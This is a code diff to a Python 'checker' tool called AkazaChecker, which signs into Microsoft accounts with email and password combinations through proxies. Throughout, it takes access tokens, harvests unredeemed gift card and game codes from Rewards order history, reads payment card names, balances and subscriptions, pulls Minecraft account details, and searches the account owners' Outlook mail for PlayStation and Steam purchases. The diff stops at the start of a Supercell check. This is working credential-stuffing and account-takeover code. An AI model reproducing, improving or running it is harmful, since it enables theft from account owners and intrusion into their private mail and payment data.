@@ -249,7 +249,7 @@ SERVICE_KEYWORDS = {
 }
 
 # ============================================================================
-# SECTION 6 — AkazaChecker CLASS
+# SECTION 6 — AkazaChecker CLASS (fully integrated: flux.py + hit.py + p7.py)
 # ============================================================================
 class AkazaChecker:
     def __init__(self, proxy=None):
@@ -269,23 +269,26 @@ class AkazaChecker:
         if len(p) == 4: return f'http://{p[2]}:{p[3]}@{p[0]}:{p[1]}'
         return f'http://{px}' if len(p) == 2 else px
 
+    # ── XBOX RPS LOGIN (flux.py exact) ─────────────────────────────────────
     def get_sftag_params(self):
         for _ in range(3):
             try:
-                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}
+                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                           'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive'}
                 text = self.session.get(SFTAG_URL, headers=headers, timeout=10, verify=False).text
-                match = (re.search(r'value=\\\\"(.+?)\\\\"', text, re.S) or
-                         re.search(r'value="(.+?)"', text, re.S) or
-                         re.search(r"sFTTag:'(.+?)'", text, re.S) or
-                         re.search(r'sFTTag:"(.+?)"', text, re.S) or
-                         re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
-                if match:
-                    ppft = match.group(1)
-                    match = (re.search(r'"urlPost":"(.+?)"', text, re.S) or
-                             re.search(r"urlPost:'(.+?)'", text, re.S) or
-                             re.search(r'urlPost:"(.+?)"', text, re.S) or
-                             re.search(r'<form.*?action="(.+?)"', text, re.S))
-                    if match: return match.group(1).replace('&amp;', '&'), ppft
+                ppft_m = (re.search(r'value=\\\"(.+?)\\\"', text, re.S) or
+                          re.search(r'value="(.+?)"', text, re.S) or
+                          re.search(r"sFTTag:'(.+?)'", text, re.S) or
+                          re.search(r'sFTTag:"(.+?)"', text, re.S) or
+                          re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
+                if ppft_m:
+                    ppft = ppft_m.group(1)
+                    up_m = (re.search(r'"urlPost":"(.+?)"', text, re.S) or
+                            re.search(r"urlPost:'(.+?)'", text, re.S) or
+                            re.search(r'urlPost:"(.+?)"', text, re.S) or
+                            re.search(r'<form.*?action="(.+?)"', text, re.S))
+                    if up_m: return up_m.group(1).replace('&amp;', '&'), ppft
             except: pass
             time.sleep(0.1)
         return None, None
@@ -294,7 +297,10 @@ class AkazaChecker:
         for _ in range(3):
             try:
                 data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
-                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
+                headers = {'Content-Type': 'application/x-www-form-urlencoded',
+                           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                           'Connection': 'close'}
                 r = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=12, verify=False)
                 if '#' in r.url and r.url != SFTAG_URL:
                     tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
@@ -305,14 +311,14 @@ class AkazaChecker:
                         pprid = re.search(r'name="pprid".*?value="(.+?)"', r.text).group(1)
                         uaid = re.search(r'name="uaid".*?value="(.+?)"', r.text).group(1)
                         act = re.search(r'id="fmHF".*?action="(.+?)"', r.text).group(1)
-                        r2 = self.session.post(act, data={'ipt':ipt, 'pprid':pprid, 'uaid':uaid}, allow_redirects=True, timeout=10, verify=False)
-                        ru = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"}', r2.text).group(1)
+                        r2 = self.session.post(act, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True, timeout=10, verify=False)
+                        ru = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"', r2.text).group(1)
                         r3 = self.session.get(ru, allow_redirects=True, timeout=10, verify=False)
                         tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
-                        if tk: return ('TOKEN', tk)
+                        if tk and tk != 'None': return ('TOKEN', tk)
                     except: pass
                 if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return ('2FA', None)
-                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return ('BAD', None)
+                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times', 'help us protect']): return ('BAD', None)
             except: pass
         return ('ERROR', None)
 
@@ -323,11 +329,116 @@ class AkazaChecker:
             form = soup.find('form', id='fmHF')
             if not form: break
             data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
-            action = form.get('action')
+            action = form.get('action', '')
             if action.startswith('/'): action = 'https://login.live.com' + action
-            resp = self.session.post(action, data=data, verify=False)
+            try: resp = self.session.post(action, data=data, verify=False, timeout=10)
+            except: break
         return resp
 
+    # ── OUTLOOK OAUTH2 LOGIN (p7.py / hit.py exact) ────────────────────────
+    def _outlook_login(self, email, password):
+        """Login via Outlook OAuth2 — returns (access_token, cid) or (None, None)"""
+        try:
+            # IDP check (p7.py step 1)
+            r1 = self.session.get(
+                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
+                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+                         "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"},
+                timeout=10, verify=False)
+            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
+                return None, None
+
+            time.sleep(0.3)
+
+            # OAuth2 authorize page (p7.py step 2)
+            auth_url = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
+                        "?client_info=1&haschrome=1"
+                        f"&login_hint={quote(email)}"
+                        "&mkt=en&response_type=code"
+                        "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+                        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+                        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
+            r2 = self.session.get(auth_url,
+                                  headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+                                  timeout=15, verify=False)
+
+            # Parse urlPost and PPFT (p7.py combined methods)
+            um = re.search(r'"urlPost":"([^"]+)"', r2.text)
+            if not um:
+                # fallback raw split
+                if '"urlPost":"' in r2.text:
+                    um_raw = r2.text.split('"urlPost":"')[1].split('"')[0]
+                    post_url = um_raw.replace('\\/', '/')
+                else:
+                    return None, None
+            else:
+                post_url = um.group(1).replace('\\/', '/')
+
+            # PPFT: try multiple patterns (p7.py)
+            ppft = None
+            for ppft_pat in [
+                r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"',
+                r'name="PPFT" id="i0327" value="([^"]+)"',
+                r'"sFTTag":".*?value=\\"([^"]+)\\"',
+                r'name="PPFT".*?value="([^"]+)"',
+            ]:
+                m = re.search(ppft_pat, r2.text)
+                if m: ppft = m.group(1); break
+            if not ppft: return None, None
+
+            # Submit credentials (p7.py step 3)
+            login_data = (f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1"
+                          f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
+                          f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
+                          f"&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
+                          f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
+                          f"&isRecoveryAttemptPost=0&i19=9960")
+            r3 = self.session.post(post_url, data=login_data,
+                                   headers={"Content-Type": "application/x-www-form-urlencoded",
+                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                                            "Origin": "https://login.live.com"},
+                                   allow_redirects=False, timeout=15, verify=False)
+
+            resp_low = r3.text.lower()
+            if any(x in resp_low for x in ["account or password is incorrect", "password is incorrect", "doesn't exist"]):
+                return None, None
+            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse"]):
+                return None, None
+
+            # Extract auth code
+            loc = r3.headers.get("Location", "")
+            cm = re.search(r'code=([^&"\']+)', loc)
+            if not cm:
+                cm = re.search(r'code=([^&"\']+)', r3.text)
+            if not cm: return None, None
+
+            cid = ""
+            for ck in self.session.cookies:
+                if ck.name == "MSPCID": cid = ck.value.upper(); break
+            if not cid: cid = self.session.cookies.get("MSPCID", "").upper()
+
+            # Token exchange (p7.py step 4)
+            token_data = {
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                "grant_type": "authorization_code",
+                "code": cm.group(1),
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
+                "client_info": "1"
+            }
+            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+                                   data=token_data,
+                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                   timeout=15, verify=False)
+            if r4.status_code != 200 or "access_token" not in r4.text: return None, None
+            tok = r4.json().get("access_token")
+            return (tok, cid) if tok else (None, None)
+        except Exception as e:
+            logger.debug(f"Outlook login error {email}: {e}")
+            return None, None
+
+    # ── REWARDS POINTS ─────────────────────────────────────────────────────
     def get_rewards_points(self):
         try:
             r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=8, verify=False)
@@ -345,103 +456,138 @@ class AkazaChecker:
         except: pass
         return 0
 
+    # ── REDEMPTION CODES (flux.py full logic) ──────────────────────────────
     def get_redemption_codes(self):
         codes = []
         try:
-            r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10, verify=False))
+            r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory',
+                                                   headers={'Referer': 'https://rewards.bing.com/'}, timeout=12, verify=False))
             soup = BeautifulSoup(r.text, 'html.parser')
             vt_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
             vt = vt_input.get('value', '') if vt_input else ''
             table = soup.find('table', class_='table')
             rows = []
-            if table and table.tbody: rows = table.tbody.find_all('tr')
+            if table and table.find('tbody'): rows = table.find('tbody').find_all('tr')
             elif table: rows = table.find_all('tr')
             for row in rows:
                 cells = row.find_all(['td', 'th'])
                 if len(cells) < 3: continue
-                title, date = cells[2].get_text(strip=True), cells[1].get_text(strip=True)
-                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
+                title = cells[2].get_text(strip=True)
+                date  = cells[1].get_text(strip=True)
+                cat   = self.detect_category(title, row.get_text(strip=True))
+                btn   = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                 if btn:
                     act = btn.get('data-actionurl', '').replace('&amp;', '&')
                     if act.startswith('/'): act = 'https://rewards.bing.com' + act
-                    try: cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False).text
+                    try:
+                        cr = self.session.post(act, data={'__RequestVerificationToken': vt},
+                                               headers={'X-Requested-With': 'XMLHttpRequest',
+                                                        'Content-Type': 'application/x-www-form-urlencoded'},
+                                               timeout=12, verify=False).text
                     except: continue
-                    code_found = False; cat = self.detect_category(title, cr)
-                    csoup = BeautifulSoup(cr, 'html.parser')
-                    # a. resendSuccess tango keys
+                    csoup  = BeautifulSoup(cr, 'html.parser')
+                    code_v = None
+
+                    # a. resendSuccess tango div
                     rs = csoup.find('div', class_='resendSuccess')
                     if rs:
-                        for k, v in zip(rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I)), rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))):
-                            if any(x in k.get_text(strip=True).upper() for x in ['CODE', 'PIN']):
-                                c = v.get_text(strip=True)
-                                if '*' not in c: codes.append({'code': c, 'category': cat, 'redemption_url': '', 'date': date}); code_found = True; break
-                    if code_found: continue
-                    # b. Redemption URL patterns
+                        tk_divs = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
+                        tv_divs = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
+                        for k, v in zip(tk_divs, tv_divs):
+                            kt = k.get_text(strip=True).upper()
+                            if 'CODE' in kt or 'PIN' in kt:
+                                cv = v.get_text(strip=True)
+                                if cv and '*' not in cv: code_v = cv; break
+
+                    # b. Multi-pattern code extraction
+                    if not code_v:
+                        for pat in CODE_PATTERNS:
+                            m = re.search(pat, cr)
+                            if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
+                                code_v = m.group(); break
+
+                    # c. PIN:/CODE: label
+                    if not code_v:
+                        m = re.search(r'(?:PIN|CODE)\s*:\s*([A-Z0-9]{4}[A-Z0-9\-]{8,})', cr, re.I)
+                        if m and '*' not in m.group(1): code_v = m.group(1)
+
+                    # d. Clipboard button
+                    if not code_v:
+                        for cb in csoup.find_all('button', attrs={'data-clipboard-text': True}):
+                            val = cb.get('data-clipboard-text', '').strip()
+                            if val and len(val) >= 12 and '*' not in val: code_v = val; break
+
+                    # e. pre/code tags
+                    if not code_v:
+                        for tag in csoup.find_all(['pre', 'code']):
+                            txt = tag.get_text(strip=True)
+                            for pat in CODE_PATTERNS:
+                                if re.fullmatch(pat, txt) and '*' not in txt: code_v = txt; break
+                            if code_v: break
+
+                    # Redemption URL
                     ru = ''
-                    for rp in [r"<a[^>]*href=['\"]([^'\"]*)['|\"][^>]*>Redemption URL</a>", r'href="([^"]*redeem[^"]*)"', r'href="([^"]*claim[^"]*)"']:
+                    for rp in [r"""<a[^>]*href=['"]([^'"]+)['"][^>]*>\s*Redemption URL\s*</a>""",
+                                r'href="([^"]*redeem[^"]*)"', r'href="([^"]*claim[^"]*)"',
+                                r'Redemption URL[:\s]+(https?://[^\s<>"]+)']:
                         rm = re.search(rp, cr, re.IGNORECASE)
                         if rm: ru = rm.group(1).strip(); break
-                    # c. Pattern matching (5/4/3-part)
-                    for p in CODE_PATTERNS:
-                        m = re.search(p, cr)
-                        if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
-                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True; break
-                    # d. PIN/CODE label
-                    if not code_found:
-                        m = re.search(r'(?:PIN|CODE)\s*:\s*([A-Z0-9]{4}-[A-Z0-9\-]+)', cr, re.I)
-                        if m and '*' not in m.group(1): codes.append({'code': m.group(1), 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True
-                    # e. Clipboard button
-                    if not code_found:
-                        for cb in csoup.find_all('button', attrs={'data-clipboard-text': True}):
-                            val = cb['data-clipboard-text'].strip()
-                            if val and len(val) >= 12 and '*' not in val: codes.append({'code': val, 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True; break
-                    # f. pre/code tags
-                    if not code_found:
-                        for tag in csoup.find_all(['pre', 'code']):
-                            for p in CODE_PATTERNS:
-                                m = re.match(p, tag.get_text(strip=True))
-                                if m and '*' not in m.group(): codes.append({'code': m.group(), 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True; break
-                            if code_found: break
+
+                    if code_v:
+                        codes.append({'code': code_v, 'category': cat, 'redemption_url': ru, 'date': date})
                 else:
+                    # No button — direct cell text
                     code_text = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
-                    cat = self.detect_category(title, code_text)
-                    for p in CODE_PATTERNS:
-                        m = re.search(p, code_text)
+                    for pat in CODE_PATTERNS:
+                        m = re.search(pat, code_text)
                         if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
                             codes.append({'code': m.group(), 'category': cat, 'redemption_url': '', 'date': date}); break
-        except: pass
+        except Exception as e:
+            logger.debug(f"get_redemption_codes error: {e}")
         return codes
 
     def detect_category(self, title, row_text=''):
-        t = (title + row_text).lower()
+        t = (title + ' ' + row_text).lower()
         if 'overwatch' in t: return 'Overwatch'
         if 'sea of thieves' in t or 'ancient coins' in t: return 'Sea of Thieves'
         if 'roblox' in t or 'robux' in t: return 'Roblox'
         if 'league' in t or 'riot' in t or ' lol ' in t: return 'League of Legends'
         if 'game pass' in t or 'gamepass' in t: return 'Game Pass'
         if 'minecraft' in t or 'minecoins' in t: return 'Minecraft'
-        if any(x in t for x in ['gift card', 'giftcard', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'subway', 'doordash', 'uber', 'target', 'spotify']): return 'Gift Card'
+        if any(x in t for x in ['gift card', 'giftcard', 'amazon', 'xbox', 'nintendo', 'playstation',
+                                 'starbucks', 'walmart', 'subway', 'doordash', 'uber', 'target', 'spotify']): return 'Gift Card'
+        if 'steam' in t: return 'Steam Gift Card'
         return 'Unknown'
 
+    # ── MICROSOFT SUBSCRIPTIONS (hit.py enhanced) ──────────────────────────
     def get_microsoft_subs(self):
         try:
             uid = str(uuid.uuid4()).replace('-', '')[:16]
-            u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none"
+            u = (f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
+                 f"&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
+                 f"&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
+                 f"&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none")
             r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15, verify=False)
             tk_m = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
-            if not tk_m: return {"status":"FREE","subs":[],"balance":"","card":""}
+            if not tk_m: return {"status": "FREE", "subs": [], "balance": "", "card": ""}
             tk = unquote(tk_m.group(1))
-            h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
-            bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=h, timeout=12, verify=False).text
-            bal_m = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
+            h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()),
+                 "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
+            bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
+                                     headers=h, timeout=12, verify=False).text
+            bal_m  = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
             card_m = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_r, re.S)
-            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=12, verify=False).text
+            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
+                                  headers=h, timeout=12, verify=False).text
             subs = []
-            keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS', 'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD', 'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL', 'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
-            for k, disp in keys.items():
+            sub_keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS',
+                        'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD',
+                        'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL',
+                        'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
+            for k, disp in sub_keys.items():
                 if k in rt:
                     si = {'name': disp, 'is_expired': False}
-                    rd_m = re.search(rf'"{k}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt, re.S)
+                    rd_m = re.search(rf'"{re.escape(k)}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt, re.S)
                     if rd_m:
                         si['renewal_date'] = rd_m.group(1)
                         try:
@@ -450,111 +596,180 @@ class AkazaChecker:
                             if rem < 0: si['is_expired'] = True
                         except: pass
                     ar_m = re.search(r'"autoRenew"\s*:\s*(true|false)', rt)
-                    if ar_m: si['auto_renew'] = 'YES' if ar_m.group(1)=='true' else 'NO'
+                    if ar_m: si['auto_renew'] = 'YES' if ar_m.group(1) == 'true' else 'NO'
                     amt_m = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', rt)
                     if amt_m: si['amount'] = amt_m.group(1)
                     cur_m = re.search(r'"currency"\s*:\s*"([^"]+)"', rt)
                     if cur_m: si['currency'] = cur_m.group(1)
                     subs.append(si)
-            return {"status": "PREMIUM" if subs else "FREE", "subs": subs, "balance": "$"+bal_m.group(1) if bal_m else "", "card": card_m.group(1) if card_m else ""}
-        except: return {"status":"FREE","subs":[],"balance":"","card":""}
+            return {"status": "PREMIUM" if subs else "FREE", "subs": subs,
+                    "balance": "$" + bal_m.group(1) if bal_m else "",
+                    "card": card_m.group(1) if card_m else ""}
+        except: return {"status": "FREE", "subs": [], "balance": "", "card": ""}
 
+    # ── PROFILE (using Outlook token) ──────────────────────────────────────
     def get_profile(self, tk, cid):
         try:
-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
-            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=12, verify=False).json()
-            return r.get('displayName', 'N/A'), r.get('country') or r.get('location', {}).get('country') or 'N/A'
-        except: return 'N/A', 'N/A'
-
-    def get_minecraft_enhanced(self, tk):
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
+                 'User-Agent': 'Outlook-Android/2.0'}
+            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',
+                                 headers=h, timeout=12, verify=False)
+            if r.status_code == 200:
+                d = r.json()
+                name = d.get('displayName', '') or d.get('names', [{}])[0].get('displayName', 'N/A')
+                country = (d.get('geography', {}).get('country') or
+                           d.get('location', {}).get('country') or 'N/A')
+                return name or 'N/A', country
+        except: pass
+        # Fallback: Graph API
         try:
-            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com","RpsTicket":f"d={tk}"},"RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"}, timeout=10, verify=False).json()
-            xbl_tk, uhs = r1['Token'], r1['DisplayClaims']['xui'][0]['uhs']
-            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties":{"SandboxId":"RETAIL","UserTokens":[xbl_tk]},"RelyingParty":"rp://api.minecraftservices.com/","TokenType":"JWT"}, timeout=10, verify=False).json()
+            r = self.session.get('https://graph.microsoft.com/v1.0/me',
+                                 headers={'Authorization': f'Bearer {tk}'}, timeout=8, verify=False)
+            if r.status_code == 200:
+                d = r.json()
+                return d.get('displayName', 'N/A'), d.get('country', 'N/A')
+        except: pass
+        return 'N/A', 'N/A'
+
+    # ── MINECRAFT (Xbox Live → XSTS → MC API) ─────────────────────────────
+    def get_minecraft_enhanced(self, xbox_tk):
+        try:
+            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate",
+                                   json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
+                                                         "RpsTicket": f"d={xbox_tk}"},
+                                         "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
+                                   timeout=10, verify=False).json()
+            xbl_tk = r1['Token']
+            uhs    = r1['DisplayClaims']['xui'][0]['uhs']
+            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize",
+                                   json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_tk]},
+                                         "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"},
+                                   timeout=10, verify=False).json()
+            if 'XErr' in str(r2): return {"owned": False}
             xsts_tk = r2['Token']
-            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken":f"XBL3.0 x={uhs};{xsts_tk}"}, timeout=10, verify=False).json()
+            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox",
+                                   json={"identityToken": f"XBL3.0 x={uhs};{xsts_tk}"},
+                                   timeout=10, verify=False).json()
             mc_tk = r3['access_token']
-            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization":f"Bearer {mc_tk}"}, timeout=10, verify=False)
+            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile",
+                                  headers={"Authorization": f"Bearer {mc_tk}"}, timeout=10, verify=False)
             if r4.status_code == 200:
                 d = r4.json()
-                return {"owned": True, "username": d['name'], "uuid": d.get('id', ''), "capes": [c.get('alias', '') for c in d.get('capes', [])]}
+                return {"owned": True, "username": d.get('name', '?'),
+                        "uuid": d.get('id', ''),
+                        "capes": [c.get('alias', '') for c in d.get('capes', []) if c.get('alias')]}
         except: pass
         return {"owned": False}
 
+    # ── PSN CHECK (hit.py) ─────────────────────────────────────────────────
     def check_psn(self, tk, cid):
         try:
-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation Order Number"}, "Size": 25}]}
-            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=12, verify=False).json()
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
+                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                     "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation OR PSN"},
+                                     "Size": 25}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query",
+                                  json=p, headers=h, timeout=12, verify=False).json()
             rset = r['EntitySets'][0]['ResultSets'][0]
             total = rset.get('Total', 0)
             purchases = []
             if total > 0:
                 for hit in rset.get('Results', []):
-                    text = (hit.get('Subject', '') + hit.get('Preview', '')).lower()
-                    m = re.search(r'purchasing\s+([^\.]+)', text)
+                    subj = hit.get('Subject', '')
+                    m = re.search(r'(?:Thank you for|purchasing|ordered?:?)\s+([^\.\n]{5,60})', subj, re.I)
                     if m: purchases.append(m.group(1).strip())
-            return {"count": total, "items": list(set(purchases))[:5]}
+            return {"count": int(total), "items": list(dict.fromkeys(purchases))[:5]}
         except: return {"count": 0, "items": []}
 
+    # ── STEAM CHECK (hit.py) ───────────────────────────────────────────────
     def check_steam(self, tk, cid):
         try:
-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 10}]}
-            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10, verify=False).json()
-            total = r['EntitySets'][0]['ResultSets'][0].get('Total', 0)
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
+                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                     "Query": {"QueryString": "noreply@steampowered.com"},
+                                     "Size": 10}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query",
+                                  json=p, headers=h, timeout=10, verify=False).json()
+            total = int(r['EntitySets'][0]['ResultSets'][0].get('Total', 0))
             return {"count": total}
         except: return {"count": 0}
 
+    # ── SUPERCELL CHECK (hit.py) ───────────────────────────────────────────
     def check_supercell(self, tk, cid):
         try:
